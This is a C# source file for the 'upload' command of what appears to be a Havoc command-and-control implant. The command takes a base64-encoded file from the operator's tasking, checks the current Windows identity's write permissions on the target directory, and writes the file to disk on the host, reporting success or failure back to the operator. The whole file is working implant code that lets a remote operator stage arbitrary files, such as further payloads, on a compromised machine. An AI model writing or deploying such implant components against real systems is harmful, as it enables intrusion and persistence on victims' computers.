using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace HavocImplant.AgentFunctions
{
    public class Upload : CommandInterface
    {
        public override string Command => "upload";
        public override bool Dangerous => false;
        public override async Task Run(int taskId)
        {
            Output = "";
            bool isRelativePath = false;
            string outputLocation = Agent.taskingInformation[taskId].taskArguments;

            if (outputLocation.EndsWith("\\") || string.IsNullOrEmpty(outputLocation))
            {
                Output = "Please include the file name in the path to upload";
                ReturnOutput(taskId);
                return;
            }

            if (!outputLocation.StartsWith("\\") && !Regex.Match(outputLocation.ToLower(), @"^\D:\\").Success) isRelativePath = true;
            string dir = parseDirectory(outputLocation, isRelativePath);

            outputLocation = Path.GetFullPath(Path.Combine(new string[] { dir, outputLocation }));

            byte[] fileBytes = Convert.FromBase64String(Agent.taskingInformation[taskId].taskFile);

            if (Directory.Exists(dir))
            {
                if (checkWriteAccess(dir)) //success
                {
                    File.WriteAllBytes(outputLocation, fileBytes);
                    if (!File.Exists(outputLocation))
                    {
                        Output = $"Something went wrong when uploading to {outputLocation}";
                        ReturnOutput(taskId);
                        return;
                    }
                    Output = $"Uploaded to {outputLocation} with {fileBytes.Length} bytes";
                    ReturnOutput(taskId);
                    return;
                }
                else
                {
                    Output = $"Could not upload {outputLocation} due to lack of permissions";
                    ReturnOutput(taskId);
                    return;
                }
            }
            else
            {
                Output = $"{dir} does not exist";
                ReturnOutput(taskId);
                return;
            }
        }
        public static bool checkWriteAccess(string dir)
        {
            string DirectoryPath = dir;
            FileSystemRights AccessRight = FileSystemRights.CreateFiles | FileSystemRights.WriteData;


            AuthorizationRuleCollection rules = Directory.GetAccessControl(DirectoryPath).GetAccessRules(true, true, typeof(System.Security.Principal.SecurityIdentifier));
            WindowsIdentity identity = WindowsIdentity.GetCurrent();

            foreach (FileSystemAccessRule rule in rules)
            {
                if (identity.Groups.Contains(rule.IdentityReference))
                {
                    if ((AccessRight & rule.FileSystemRights) == AccessRight)
                    {
                        if ((AccessRight & rule.FileSystemRights) == AccessRight && (rule.FileSystemRights & FileSystemRights.WriteData) > 0)
                            return true;
                    }
                }
            }
            return false;
        }
        public static string parseDirectory(string dir, bool isRelativePath)
        {
            dir = dir.Replace("\"", "");
            string retVal = "";
            if (!isRelativePath)
            {
                var tmp = Regex.Split(dir, @"(?<=[\\])").ToList<string>();
                tmp.RemoveAt(tmp.Count - 1);
                dir = Path.GetFullPath(Path.Combine(new string[] { String.Concat(tmp.ToArray<string>()) }));
            }
            else
                dir = Path.GetFullPath(Directory.GetCurrentDirectory());
            return dir;
        }
    }
}
